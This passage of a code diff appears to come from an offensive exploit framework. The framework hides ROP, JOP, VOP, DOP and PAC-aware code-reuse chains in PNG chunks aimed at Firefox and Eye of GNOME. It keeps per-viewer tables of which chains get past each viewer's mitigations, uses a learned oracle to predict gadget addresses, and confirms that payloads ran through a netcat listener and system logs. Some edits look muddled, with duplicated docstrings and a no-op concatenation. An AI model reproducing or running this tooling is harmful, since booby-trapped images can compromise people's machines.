+        return  # skip unreadable/privileged file
+
+    start = LAST_OFFSETS.get(file_path, 0)
+    try:
+        with open(file_path, "rb") as f:
+            f.seek(start)
+            data = f.read()
+            LAST_OFFSETS[file_path] = f.tell()
+    except Exception:
+        return
+
+    for line in data.decode(errors="ignore").splitlines():
+        yield line
+def verify_payload_execution(
+    unique_id: str,
+    viewer_name: str,
+    payload: str,
+    timeout: int = 5,
+    nc_process: subprocess.Popen = None,
+    nc_output_file: str = None,
+    viewer_process: subprocess.Popen = None,
+) -> bool:
+    """
+    Verify payload execution by analyzing the following indicators:
+
+        1. Net‑cat listener logs (only the newest file).
+        2. System logs via journalctl or incremental syslog scanning.
+        3. Small, readable log files that might contain the trigger.
+           (e.g. /tmp, /var/log/daemon.log, etc.)
+
+    The function returns *True* as soon as the unique_id is found in any of the
+    sources.  It never re‑reads data that has already been processed.
+    """
+    logger.info(f"Verifying payload execution for {viewer_name} with unique_id: {unique_id}")
+
+    # 1. Net‑cat check
+    if _search_netcat_unique_id(unique_id):
+        logger.info("Payload execution confirmed via netcat log")
+        return True
+
+    # 2. System‑log / journalctl check
+    if _search_syslog_unique_id(unique_id):
+        logger.info("Payload execution confirmed via system logs")
+        return True
+
+    # 3. Small‑file fallback (only 200 kB per file, read incrementally)
+    candidate_dirs = (
+        "./logs/files/netcat",
+        "./logs/files",
+        "/tmp",
+        "/var/log",
+    )
+    for d in candidate_dirs:
+        if not os.path.isdir(d):
+            continue
+        try:
+            for entry in os.scandir(d):
+                if not entry.is_file():
+                    continue
+                # Skip huge files – we only care about small log snippets
+                if os.path.getsize(entry.path) > 200_000:
+                    continue
+                for line in _read_new_lines(entry.path):
+                    if unique_id in line:
+                        logger.info(f"Payload execution confirmed in {entry.path}")
+                        return True
+        except Exception as exc:
+            logger.debug(f"Scanning directory {d} failed: {exc}")
+
+    # 4. If we reach here the unique_id was not found.
+    logger.warning(f"Payload execution NOT CONFIRMED: '{unique_id}' not found within timeout {timeout}s")
     return False
 
 def log_validated_payload_to_tensorboard(writer: SummaryWriter, image_path: str, viewer_name: str, fuzz_type: str, step: int):
@@ -1517,7 +2112,16 @@ def compile_rop_chain_pac_aware(arch: str, gadgets: List[Dict], payload_addr: in
 
 # ==================== INSTRUMENTATION VALIDATION & ENHANCEMENT FUNCTIONS ====================
 
-def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default") -> Dict[str, any]:
+def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default") -> Dict:
+    """Validate that instrumentation markers are correctly embedded in a PNG file.
+    
+    Args:
+        file_path: Path to the PNG file to validate.
+        fuzz_type: Type of fuzzing applied to the file.
+    
+    Returns:
+        Dictionary with validation results and detected instrumentation markers.
+    """
     """
     Inspects PNG file for wrongful embeddings and instrumentation validation.
     Detects misplaced tags, orphaned chains, and instrumentation integrity issues.
@@ -1532,6 +2136,7 @@ def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default
     validation_result = {
         "valid": True,
         "issues": [],
+        "warnings": [],
         "embeddings": {},
         "missing_triggers": [],
         "payload_integrity": True,
@@ -1552,12 +2157,20 @@ def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default
             fitness_ok_positions.append(idx)
             idx += 1
         
-        # FITNESS_OK should only appear at END of final payload, not embedded in chains
+        # FITNESS_OK can appear multiple times during heap spray (recoverable warning)
         if len(fitness_ok_positions) > 1:
-            validation_result["issues"].append(f"Multiple FITNESS_OK markers found ({len(fitness_ok_positions)}), should be only 1")
-            validation_result["valid"] = False
-            for pos in fitness_ok_positions[:-1]:  # All but last are wrong
-                validation_result["doubtful_fitness_markers"].append(pos)
+            validation_result["warnings"].append(f"Multiple FITNESS_OK markers found ({len(fitness_ok_positions)}), expected during heap spray - keeping last occurrence only")
+            validation_result["doubtful_fitness_markers"].extend(fitness_ok_positions[:-1])
+            
+            # Deduplicate: remove all FITNESS_OK except the last occurrence
+            for pos in sorted(fitness_ok_positions[:-1], reverse=True):
+                # Find the boundary of the FITNESS_OK marker (including null terminator if present)
+                end_pos = pos + len(b"FITNESS_OK")
+                # Check if followed by null terminator or newline
+                if end_pos < len(content) and content[end_pos:end_pos+1] in [b'\x00', b'\n']:
+                    end_pos += 1
+                # Remove this marker
+                content = content[:pos] + content[end_pos:]
         
         # Check for chain embeddings
         chain_types = {
@@ -1588,8 +2201,8 @@ def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default
         
         # For optimization_bypass and uaf, payload must be properly wrapped
         if fuzz_type in ["optimization_bypass", "uaf"]:
-            if b"InfectionPayload" not in content:
-                validation_result["missing_triggers"].append("InfectionPayload marker missing")
+            if b"INJECTED_PAYLOAD" not in content:
+                validation_result["missing_triggers"].append("INJECTED_PAYLOAD marker missing")
                 validation_result["valid"] = False
             
             # Check for vtable object structure (should be 72 bytes: 64 cmd + 8 vtable)
@@ -1612,7 +2225,17 @@ def validate_instrumentation_embedding(file_path: str, fuzz_type: str = "default
         return validation_result
 
 
-def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_offset: int = 0) -> Dict[str, any]:
+def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_offset: int = 0) -> Dict:
+    """Analyze payload trigger-to-execution alignment in a PNG file.
+    
+    Args:
+        file_path: Path to the PNG file to analyze.
+        fuzz_type: Type of fuzzing (e.g., 'overflow', 'uaf', 'metadata_trigger').
+        trigger_offset: How far the payload was slid from its original position.
+    
+    Returns:
+        Dictionary with alignment analysis including quality rating and recommendations.
+    """
     """
     Analyzes payload trigger-to-execution alignment.
     Ensures trigger can properly reach payload in memory.
@@ -1649,17 +2272,22 @@ def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_of
             "optimization_bypass": b"ROP_",  # Trigger is ROP chain itself
         }
         
-        payload_marker = b"InfectionPayload"
+        payload_marker = b"INJECTED_PAYLOAD"
         
         trigger_pos = -1
         gap = -1  # Initialize gap to -1 (invalid/not found)
-        trigger_type = trigger_markers.get(fuzz_type, b"tEXt")
-        
-        if trigger_type in content:
-            trigger_pos = content.find(trigger_type)
-            analysis["trigger_type"] = fuzz_type
-        
+        trigger_marker = trigger_markers.get(fuzz_type, None)
         payload_pos = content.find(payload_marker)
+
+        if trigger_marker and trigger_marker in content:
+            trigger_pos = content.find(trigger_marker)
+            analysis["trigger_type"] = fuzz_type
+        elif b"TriggerPayload" in content:
+            trigger_pos = content.find(b"TriggerPayload")
+            analysis["trigger_type"] = "TriggerPayload"
+        elif b"tEXt" in content:
+            trigger_pos = content.find(b"tEXt")
+            analysis["trigger_type"] = "tEXt_fallback"
         
         if trigger_pos >= 0 and payload_pos >= 0:
             gap = payload_pos - trigger_pos
@@ -1694,7 +2322,7 @@ def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_of
             elif trigger_offset < 8:
                 analysis["recommendations"].append(f"Payload slide of {trigger_offset} bytes may be too small for proper fuzzing")
         
-        logger.info(f"Trigger-payload alignment: {analysis['alignment_quality']} (gap={gap if gap >= 0 else 'N/A'} bytes)")
+        logger.info(f"Trigger-payload alignment: {analysis['alignment_quality']} (gap={analysis['gap_bytes']} bytes)")
         
         return analysis
     
@@ -1704,7 +2332,16 @@ def analyze_trigger_payload_alignment(file_path: str, fuzz_type: str, trigger_of
         return analysis
 
 
-def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None) -> Dict[str, any]:
+def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None) -> Dict:
+    """Detect CFI (Control Flow Integrity) and BTI (Branch Target Identification) mitigations.
+    
+    Args:
+        viewer_name: Name of the viewer being analyzed (e.g., 'firefox', 'eog', 'png_consumer').
+        crash_log: Optional crash log output to analyze for mitigation signatures.
+    
+    Returns:
+        Dictionary with mitigation detection results and recommended chain types.
+    """
     """
     Detects CFI (Control Flow Integrity) and BTI (Branch Target Identification) mitigations.
     Tracks when payloads reach execution but are blocked by mitigations.
@@ -1727,6 +2364,7 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
             "VOP": "unknown",
             "DOP": "unknown",
             "PAC_ROP": "unknown",
+            "PAC_DOP": "unknown",
         },
         "indicators": [],
         "recommended_chains": [],
@@ -1736,9 +2374,33 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
     try:
         # Check viewer-specific known mitigations
         viewer_mitigations = {
-            "firefox": {"cfi": True, "bti": True, "name": "Firefox (strong mitigations)"},
-            "eog": {"cfi": False, "bti": False, "name": "Eye of GNOME (minimal mitigations)"},
-            "png_consumer": {"cfi": False, "bti": False, "name": "png_consumer (test binary)"},
+            "firefox": {
+                "cfi": True,
+                "bti": True,
+                "name": "Firefox (strong mitigations)",
+                "rop": "blocked",
+                "jop": "blocked",
+                "vop": "works",
+                "dop": "works",
+                "pac_rop": "works",
+                "pac_dop": "works"
+            },
+            "eog": {
+                "cfi": False,
+                "bti": False,
+                "name": "Eye of GNOME (minimal mitigations)",
+                "rop": "works",
+                "jop": "blocked",
+                "vop": "works",
+                "dop": "works"
+            },
+            "png_consumer": {
+                "cfi": False,
+                "bti": False,
+                "name": "png_consumer (test binary)",
+                "rop": "works",
+                "jop": "blocked"
+            },
         }
         
         if viewer_name in viewer_mitigations:
@@ -1746,6 +2408,10 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
             mitigation_info["cfi_enabled"] = vm["cfi"]
             mitigation_info["bti_enabled"] = vm["bti"]
             mitigation_info["indicators"].append(f"{vm['name']}")
+            for chain_key in mitigation_info["bypass_chains"]:
+                status_key = chain_key.lower() if chain_key != "PAC_DOP" else "pac_dop"
+                if status_key in vm:
+                    mitigation_info["bypass_chains"][chain_key] = vm[status_key]
         
         # Analyze crash log for mitigation indicators
         if crash_log:
@@ -1772,7 +2438,25 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
                 mitigation_info["mitigation_state"] = "confirmed"
         
         # Recommend chains based on detected mitigations
-        if mitigation_info["cfi_enabled"]:
+        if viewer_name == "eog":
+            mitigation_info["recommended_chains"] = ["ROP", "VOP", "DOP"]
+            mitigation_info["bypass_chains"]["JOP"] = "blocked"
+            mitigation_info["bypass_chains"]["ROP"] = "works"
+            mitigation_info["bypass_chains"]["VOP"] = "works"
+            mitigation_info["bypass_chains"]["DOP"] = "works"
+        elif viewer_name == "firefox":
+            mitigation_info["recommended_chains"] = ["PAC_DOP", "VOP", "DOP", "PAC_ROP"]
+            mitigation_info["bypass_chains"]["ROP"] = "blocked"
+            mitigation_info["bypass_chains"]["JOP"] = "blocked"
+            mitigation_info["bypass_chains"]["VOP"] = "works"
+            mitigation_info["bypass_chains"]["DOP"] = "works"
+            mitigation_info["bypass_chains"]["PAC_ROP"] = "works"
+            mitigation_info["bypass_chains"]["PAC_DOP"] = "works"
+        elif viewer_name == "png_consumer":
+            mitigation_info["recommended_chains"] = ["ROP"]
+            mitigation_info["bypass_chains"]["ROP"] = "works"
+            mitigation_info["bypass_chains"]["JOP"] = "blocked"
+        elif mitigation_info["cfi_enabled"]:
             mitigation_info["bypass_chains"]["ROP"] = "blocked"
             mitigation_info["bypass_chains"]["JOP"] = "blocked"
             mitigation_info["bypass_chains"]["PAC_ROP"] = "works"
@@ -1780,10 +2464,12 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
         else:
             mitigation_info["bypass_chains"]["ROP"] = "works"
             mitigation_info["recommended_chains"] = ["ROP", "JOP"]
-        
+
         if mitigation_info["bti_enabled"]:
             mitigation_info["bypass_chains"]["VOP"] = "works"
             mitigation_info["bypass_chains"]["DOP"] = "works"
+            if not mitigation_info["recommended_chains"]:
+                mitigation_info["recommended_chains"] = ["VOP", "DOP"]
         
         logger.info(f"Mitigation detection for {viewer_name}: {mitigation_info['mitigation_state']}")
         if mitigation_info["indicators"]:
@@ -1798,7 +2484,20 @@ def detect_cfi_bti_mitigations(viewer_name: str, crash_log: Optional[str] = None
 
 def compute_enhanced_fitness_score(fuzz_type: str, chain_type: str, payload_size: int, 
                                    trigger_alignment: Dict, mitigation_info: Dict, 
-                                   execution_confirmed: bool = False) -> Dict[str, any]:
+                                   execution_confirmed: bool = False) -> Dict:
+    """Compute enhanced fitness score for a payload configuration.
+    
+    Args:
+        fuzz_type: Type of fuzzing (e.g., 'overflow', 'uaf', 'metadata_trigger').
+        chain_type: Type of exploit chain (e.g., 'ROP', 'JOP', 'VOP', 'DOP', 'PAC_ROP').
+        payload_size: Size of the payload in bytes.
+        trigger_alignment: Alignment analysis from analyze_trigger_payload_alignment().
+        mitigation_info: Mitigation detection from detect_cfi_bti_mitigations().
+        execution_confirmed: Whether payload execution has been confirmed.
+    
+    Returns:
+        Dictionary with overall fitness score (0.0-1.0) and component breakdown.
+    """
     """
     Computes enhanced fitness score for payload configuration.
     Combines multiple factors: chain type, payload size, alignment, mitigations, execution.
@@ -1858,6 +2557,7 @@ def compute_enhanced_fitness_score(fuzz_type: str, chain_type: str, payload_size
             "PAC_ROP": {"no_mit": 0.9, "cfi": 0.95, "bti": 0.95},
             "VOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
             "DOP": {"no_mit": 0.8, "cfi": 0.7, "bti": 0.85},
+            "PAC_DOP": {"no_mit": 0.85, "cfi": 0.92, "bti": 0.95},
         }
         
         mit_key = "no_mit"
@@ -1928,10 +2628,167 @@ def compute_enhanced_fitness_score(fuzz_type: str, chain_type: str, payload_size
         return fitness
 
 
+# PNG Chunk Structure Coverage System
+# ====================================
+
+class PNGChunkTarget:
+    """Defines different PNG structures for comprehensive fuzzing coverage."""
+    
+    # Basic ancillary chunks
+    TEXT = "tEXt"           # Text metadata
+    ZTXT = "zTXt"           # Compressed text
+    ITXT = "iTXt"           # International text
+    
+    # Thumbnail metadata
+    THUMB = "tHUm"          # Thumbnail (private chunk)
+    TNVX = "tNVX"           # Thumbnail info
+    
+    # Animation metadata
+    ACTL = "acTL"           # Animation control
+    FCTL = "fcTL"           # Frame control
+    FDAT = "fdAT"           # Frame data
+    
+    # EXIF and other metadata
+    EXIF = "eXIf"           # EXIF data
+    IMET = "iMet"           # Image metadata
+    OFFS = "oFFs"           # Image offset
+    
+    # Gamma and color
+    GAMA = "gAMA"           # Gamma
+    CHRM = "cHRM"           # Chromaticity
+    
+    ALL = [TEXT, ZTXT, ITXT, THUMB, TNVX, ACTL, FCTL, FDAT, EXIF, IMET, OFFS, GAMA, CHRM]
+
+
+def _find_png_chunk_offset(content: bytearray, chunk_type: bytes) -> Optional[int]:
+    """Find the byte offset of a PNG chunk by type."""
+    offset = 8
+    while offset + 12 <= len(content):
+        length = int.from_bytes(content[offset:offset + 4], 'big')
+        current_type = content[offset + 4:offset + 8]
+        if current_type == chunk_type:
+            return offset
+        offset += 12 + length
+    return None
+
+
+def _insert_chunk_at_location(content: bytearray, chunk_bytes: bytes, location: str = "iend") -> bool:
+    """Insert a chunk at a target PNG location (IHDR, IDAT, IEND)."""
+    if location == "ihdr":
+        offset = _find_png_chunk_offset(content, b"IHDR")
+        if offset is None:
+            return False
+        ihdr_length = int.from_bytes(content[offset:offset + 4], 'big')
+        insert_at = offset + 12 + ihdr_length
+    elif location == "idat":
+        offset = _find_png_chunk_offset(content, b"IDAT")
+        if offset is None:
+            return False
+        insert_at = offset
+    else:
+        iend_offset = content.find(b"IEND")
+        if iend_offset == -1:
+            return False
+        insert_at = iend_offset - 4
+
+    if insert_at < 0 or insert_at > len(content):
+        return False
+
+    content[insert_at:insert_at] = chunk_bytes
+    return True
+
+
+def inject_payload_into_chunk_type(content: bytearray, chunk_type: bytes, payload_data: bytes,
+                                   location: str = "iend") -> bool:
+    """Inject payload into a specific PNG chunk type at a chosen PNG location.
+    
+    Args:
+        content: PNG file content as bytearray.
+        chunk_type: PNG chunk type (4 bytes, e.g., b"tEXt").
+        payload_data: Data to inject (will be wrapped in chunk).
+        location: Where to insert the chunk ("iend", "ihdr", or "idat").
+    
+    Returns:
+        True if injection successful, False otherwise.
+    """
+    try:
+        chunk_data = chunk_type + b"\x00" + payload_data if chunk_type in [b"tEXt", b"iTXt", b"zTXt"] else payload_data
+        chunk_length = len(chunk_data).to_bytes(4, 'big')
+        chunk_crc = calculate_png_crc(chunk_type, chunk_data[1:] if chunk_type in [b"tEXt", b"iTXt", b"zTXt"] else chunk_data)
+        chunk = chunk_length + chunk_type + chunk_data + chunk_crc
+        return _insert_chunk_at_location(content, chunk, location=location)
+    except Exception as e:
+        logger.debug(f"Failed to inject into {chunk_type.decode('latin-1', errors='ignore')}: {e}")
+        return False
+
+
+def inject_thumbnail_metadata(content: bytearray, payload: bytes, width: int = 32, height: int = 32, location: str = "iend") -> bool:
+    """Inject payload into thumbnail metadata structure."""
+    try:
+        thumb_header = bytes([width, height, 2])
+        thumb_data = b"tHUm" + b"\x00" + thumb_header + payload
+        return inject_payload_into_chunk_type(content, b"tHUm", thumb_data[:32], location=location)
+    except Exception as e:
+        logger.debug(f"Failed to inject thumbnail metadata: {e}")
+        return False
+
+
+def inject_animation_metadata(content: bytearray, payload: bytes, num_frames: int = 1, location: str = "iend") -> bool:
+    """Inject payload into animation control structure."""
+    try:
+        anim_data = num_frames.to_bytes(4, 'big') + b"\x00\x00\x00\x01" + payload[:8]
+        return inject_payload_into_chunk_type(content, b"acTL", anim_data, location=location)
+    except Exception as e:
+        logger.debug(f"Failed to inject animation metadata: {e}")
+        return False
+
+
+def inject_exif_metadata(content: bytearray, payload: bytes, location: str = "iend") -> bool:
+    """Inject payload into EXIF structure."""
+    try:
+        exif_data = b"Exif\x00\x00" + payload
+        return inject_payload_into_chunk_type(content, b"eXIf", exif_data, location=location)
+    except Exception as e:
+        logger.debug(f"Failed to inject EXIF metadata: {e}")
+        return False
+
+
+def inject_gamma_data(content: bytearray, payload: bytes, location: str = "iend") -> bool:
+    """Inject payload into gamma/color correction structure."""
+    try:
+        gamma_value = (45455).to_bytes(4, 'big')
+        gamma_data = gamma_value + payload[:4]
+        return inject_payload_into_chunk_type(content, b"gAMA", gamma_data, location=location)
+    except Exception as e:
+        logger.debug(f"Failed to inject gamma data: {e}")
+        return False
+
+
+def get_png_chunk_injection_strategies() -> Dict[str, callable]:
+    """Return mapping of chunk-structure strategies to injection functions."""
+    return {
+        "text_iend": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="iend"),
+        "text_ihdr": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="ihdr"),
+        "text_idat": lambda c, p: inject_payload_into_chunk_type(c, b"tEXt", b"Text\x00" + p, location="idat"),
+        "compressed_iend": lambda c, p: inject_payload_into_chunk_type(c, b"zTXt", b"\x00\x00" + p, location="iend"),
+        "thumbnail_iend": lambda c, p: inject_thumbnail_metadata(c, p, location="iend"),
+        "animation_iend": lambda c, p: inject_animation_metadata(c, p, location="iend"),
+        "exif_iend": lambda c, p: inject_exif_metadata(c, p, location="iend"),
+        "gamma_iend": lambda c, p: inject_gamma_data(c, p, location="iend"),
+    }
+
+
 def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigger_offset: int = 0, 
                               fuzz_type: str = "default", leaks: Dict = None, payload_offset: int = 0, 
-                              chain_base_addr: Optional[int] = None, force_chain_type: Optional[str] = None) -> bool:
-    """Advanced payload injector with ROP/JOP/VOP/DOP support."""
+                              chain_base_addr: Optional[int] = None, force_chain_type: Optional[str] = None,
+                              viewer_name: Optional[str] = None, unique_id: Optional[str] = None,
+                              chunk_injection_strategy: Optional[str] = None) -> bool:
+    """Advanced payload injector with ROP/JOP/VOP/DOP support and PNG structure coverage.
+    
+    Args:
+        chunk_injection_strategy: Which PNG chunk structure to target ("text", "thumbnail", 
+                                 "animation", "exif", "gamma", "compressed", or None for default).
+    """
     arch = "aarch64" if "aarch64" in platform.machine().lower() else "x86_64"
     leaks = leaks or {}
     
@@ -1943,25 +2800,34 @@ def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigge
         chain_type = force_chain_type
         logger.info(f"Forced chain type: {chain_type}")
     else:
-        # Original logic
         chain_type = "ROP"  # Default
-        if vop_available and os.environ.get("FORCE_VOP"):
+        if viewer_name == "firefox" and vop_available:
+            if pac_enabled:
+                chain_type = "PAC_DOP"
+                logger.info("Firefox detected with PAC + VOP support - using PAC_DOP chain")
+            else:
+                chain_type = "VOP"
+                logger.info("Firefox detected with VOP available - using VOP chain")
+        elif viewer_name == "eog" and vop_available and fuzz_type in ["metadata_trigger", "overflow"]:
+            chain_type = "VOP"
+            logger.info(f"EOG detected with VOP available - using VOP chain for {fuzz_type}")
+        elif vop_available and os.environ.get("FORCE_VOP"):
             chain_type = "VOP"
             logger.info("VOP gadgets detected and FORCE_VOP enabled - using VOP chain")
-        elif vop_available and fuzz_type in ["metadata_trigger", "overflow"]:  # VOP good for image parsers
-            chain_type = "VOP"
-            logger.info(f"VOP gadgets detected and suitable for {fuzz_type} - using VOP chain")
         elif pac_enabled and fuzz_type in ["uaf", "optimization_bypass"]:
             chain_type = "PAC_ROP"
             logger.info("PAC enabled - using PAC-aware ROP chain")
         elif fuzz_type in ["double_free", "metadata_trigger"]:
             chain_type = "JOP"
             logger.info(f"Fuzz type {fuzz_type} prefers JOP - using JOP chain")
-    
+        else:
+            logger.info(f"Defaulting to ROP chain for viewer {viewer_name} and fuzz type {fuzz_type}")
+
     debug_info = {
         "file": os.path.basename(file_path),
         "fuzz_type": fuzz_type,
         "chain_type": chain_type,  # New field tracking which chain was used
+        "unique_id": unique_id,
         "attack_chain": [],
         "leaked_addresses": {k: hex(v) if isinstance(v, int) else v for k, v in leaks.items()}
     }
@@ -2036,6 +2902,30 @@ def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigge
             
             if leaks.get("system"):
                 final_payload = leaks["system"].to_bytes(8, 'little') + final_payload
+        elif chain_type == "PAC_DOP":
+            logger.info("Injecting PAC-aware DOP chain...")
+            pac_dop_chain = compile_pac_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr, pac_enabled=True)
+            if pac_dop_chain:
+                pac_dop_key = b"PAC_DOP"
+                pac_dop_data = pac_dop_key + b"\x00" + pac_dop_chain
+                pac_dop_chunk = len(pac_dop_data).to_bytes(4, 'big') + b"tEXt" + pac_dop_data + calculate_png_crc(b"tEXt", pac_dop_data)
+                content[iend_start:iend_start] = pac_dop_chunk
+                iend_index = content.find(IEND_CHUNK)
+                iend_start = iend_index - 4
+                debug_info["attack_chain"].append("PAC_DOP")
+                logger.info("PAC-aware DOP chain injection complete")
+
+            # Fallback to the standard DOP chain if PAC_DOP was not possible
+            dop_chain = compile_dop_chain(arch, [], payload_command_addr, leaks, chain_base_addr)
+            if dop_chain and b"PAC_DOP" not in pac_dop_chain:
+                dop_key = b"DOP_Chain"
+                dop_data = dop_key + b"\x00" + dop_chain
+                dop_chunk = len(dop_data).to_bytes(4, 'big') + b"tEXt" + dop_data + calculate_png_crc(b"tEXt", dop_data)
+                content[iend_start:iend_start] = dop_chunk
+                iend_index = content.find(IEND_CHUNK)
+                iend_start = iend_index - 4
+                debug_info["attack_chain"].append("DOP_FALLBACK")
+                logger.info("DOP fallback chain injected for PAC_DOP attempt")
         
         # ==================== Standard Fuzz Type Handling ====================
         if fuzz_type == "uaf":
@@ -2148,20 +3038,69 @@ def inject_payload_with_leaks(file_path: str, payload: Union[str, bytes], trigge
         if b"FITNESS_OK" not in final_payload: 
             final_payload += b"\x00FITNESS_OK\n"
         
-        # Wrap in tEXt chunk with offset
-        p_key = b"InfectionPayload"
+        trigger_fuzz_types = {"overflow", "double_free", "uaf", "metadata_trigger", "optimization_bypass"}
+        if fuzz_type in trigger_fuzz_types:
+            trigger_key = b"TriggerPayload"
+            trigger_data = trigger_key + b"\x00" + unique_id.encode()
+            trigger_len = len(trigger_data).to_bytes(4, 'big')
+            trigger_chunk = trigger_len + b"tEXt" + trigger_data + calculate_png_crc(b"tEXt", trigger_data)
+            content[iend_start:iend_start] = trigger_chunk
+            iend_index = content.find(IEND_CHUNK)
+            iend_start = iend_index - 4
+        if fuzz_type == "double_free":
+            trigger_key = b"DoubleFree_Trigger"
+            trigger_data = trigger_key + b"\x00" + unique_id.encode()
+            trigger_len = len(trigger_data).to_bytes(4, 'big')
+            trigger_chunk = trigger_len + b"tEXt" + trigger_data + calculate_png_crc(b"tEXt", trigger_data)
+            content[iend_start:iend_start] = trigger_chunk
+            iend_index = content.find(IEND_CHUNK)
+            iend_start = iend_index - 4
+
+        # Wrap in appropriate chunk type with offset
+        p_key = b"INJECTED_PAYLOAD"
         if payload_offset > 0:
             p_data = p_key + b"\x00" + b"A" * payload_offset + final_payload
         else:
             p_data = p_key + b"\x00" + final_payload
         
-        p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
-        
+        # Apply chunk injection strategy if specified
+        if chunk_injection_strategy:
+            strategies = get_png_chunk_injection_strategies()
+            if chunk_injection_strategy in strategies:
+                logger.info(f"Applying chunk injection strategy: {chunk_injection_strategy}")
+                strategy_func = strategies[chunk_injection_strategy]
+                iend_index = content.find(IEND_CHUNK)
+                iend_start = iend_index - 4
+                
+                if strategy_func(content, final_payload):
+                    debug_info["chunk_injection_strategy"] = chunk_injection_strategy
+                    logger.debug(f"Successfully injected into {chunk_injection_strategy} chunk")
+                else:
+                    logger.warning(f"Failed to inject into {chunk_injection_strategy} chunk, falling back to tEXt")
+                    # Fall back to tEXt injection
+                    p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
+                    iend_index = content.find(IEND_CHUNK)
+                    iend_start = iend_index - 4
+                    content[iend_start:iend_start] = p_chunk
+            else:
+                logger.warning(f"Unknown chunk injection strategy: {chunk_injection_strategy}, using default tEXt")
+                p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
+                iend_index = content.find(IEND_CHUNK)
+                iend_start = iend_index - 4
+                content[iend_start:iend_start] = p_chunk
+        else:
+            # Default: tEXt chunk injection
+            p_chunk = len(p_data).to_bytes(4, 'big') + b"tEXt" + p_data + calculate_png_crc(b"tEXt", p_data)
+            iend_index = content.find(IEND_CHUNK)
+            iend_start = iend_index - 4
+            content[iend_start:iend_start] = p_chunk
+
         iend_index = content.find(IEND_CHUNK)
         iend_start = iend_index - 4
-        new_content = content[:iend_start] + p_chunk + content[iend_start:]
+        new_content = content[:iend_start] + content[iend_start:]
         new_content = find_and_update_chunk_crc(new_content, b'IDAT')
-
+        debug_info["chain_type"] = chain_type
+ 
         with open(file_path, 'wb') as f:
             f.write(new_content)
         
@@ -2219,14 +3158,22 @@ class UnifiedFuzzer:
         ]
         address_feature_dim = 25 + ELF_FEATURE_VECTOR_SIZE + len(self.viewers) + 3
         self.oracle = AddressOracle(address_feature_dim, len(self.gadget_names))
-        # Try to load saved Oracle
-        try:
-            self.oracle.load_state_dict(torch.load("models/address_oracle.pth", map_location=self.device))
-            self.use_oracle = True
-            self.oracle_accuracy = 1.0  # Assume good if saved
-            logger.info("Loaded AddressOracle model.")
-        except Exception as e:
-            logger.info(f"No AddressOracle model found or failed to load: {e}")
+        # Try to load saved Oracle from common model locations
+        oracle_candidates = find_pretrained_model_paths(model_names=["address_oracle.pth", "address_oracle_old.pth"])
+        if not oracle_candidates:
+            oracle_candidates = [os.path.join(ROOT_DIR, "models", "address_oracle.pth")]
+        for oracle_path in oracle_candidates:
+            try:
+                if os.path.exists(oracle_path):
+                    self.oracle.load_state_dict(torch.load(oracle_path, map_location=self.device))
+                    self.use_oracle = True
+                    self.oracle_accuracy = 1.0
+                    logger.info(f"Loaded AddressOracle model from {oracle_path}")
+                    break
+            except Exception as e:
+                logger.info(f"Failed to load AddressOracle model from {oracle_path}: {e}")
+        else:
+            logger.info("No AddressOracle model found or failed to load; continuing without oracle")
         self.png_consumer_successes = []
         self.leaks = leak_addresses()
         self.weaknesses = ["optimization_bypass", "uaf", "overflow", "metadata_trigger", "generic_viewer", "aggressive_viewer", "double_free"]
@@ -2240,8 +3187,9 @@ class UnifiedFuzzer:
         self.netcat_process = None
         self.netcat_output_file = ""
         self.netcat_log_dir = os.path.join(ROOT_DIR, "logs", "files", "netcat")
+        self.netcat_log_f = None
         self.netcat_port = 24444
-        self.ensure_netcat_listener()
+        #self.ensure_netcat_listener()
         
         # Track VOP/DOP success on png_consumer to upgrade payloads for other viewers
         self.png_consumer_vop_dop_success = False
@@ -2278,11 +3226,14 @@ class UnifiedFuzzer:
     def ensure_netcat_listener(self):
         """Keep a persistent netcat listener running and ensure log file path exists."""
         if self.netcat_process and self.netcat_process.poll() is None:
-            return self.netcat_process, self.netcat_output_file
+            return self.netcat_process, self.netcat_output_file, self.netcat_log_f
 
         os.makedirs(self.netcat_log_dir, exist_ok=True)
-        self.netcat_process, self.netcat_output_file = start_netcat_listener(port=self.netcat_port, log_dir=self.netcat_log_dir)
-        return self.netcat_process, self.netcat_output_file
+        self.netcat_process, self.netcat_output_file, self.netcat_log_f = start_netcat_listener(port=self.netcat_port, log_dir=self.netcat_log_dir)
+        return self.netcat_process, self.netcat_output_file, self.netcat_log_f
+
+    def ensure_netcat_listener_state(self):
+        return ensure_netcat_listener_state(self)
 
     def cleanup_netcat_listener(self):
         """Clean up the persistent netcat listener process."""
@@ -2301,6 +3252,12 @@ class UnifiedFuzzer:
             finally:
                 self.netcat_process = None
                 self.netcat_output_file = None
+                if self.netcat_log_f:
+                    try:
+                        self.netcat_log_f.close()
+                    except Exception:
+                        pass
+                    self.netcat_log_f = None
 
     def _scan_viewer_crash_logs(self, viewer_output_dir: str) -> bool:
